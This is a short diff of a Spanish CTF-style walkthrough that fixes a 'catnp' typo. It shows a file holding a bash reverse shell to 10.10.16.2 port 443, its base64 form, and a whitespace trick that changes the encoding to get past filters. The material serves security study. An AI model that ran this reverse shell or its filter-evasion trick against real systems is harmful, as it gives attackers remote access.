@@ -314,12 +314,12 @@ En este caso, en un archivo llamado `shell` guardamos el contenido de la típica
 Por lo tanto, volvemos a editar el archivo añadiendo espacios en blanco en el comando, al verificar nuveamente el código en base64, verificamos que es una cadena de texto simple.
 
 ```bash
-❯ catnp shell
+❯ cat shell
 bash -i >& /dev/tcp/10.10.16.2/443 0>&1
-❯ catnp shell | base64
+❯ cat shell | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0MyAwPiYxCg==
 ❯ nvim shell
-❯ catnp shell | base64
+❯ cat shell | base64
 YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0MyAwPiYxICAK
 ```
 
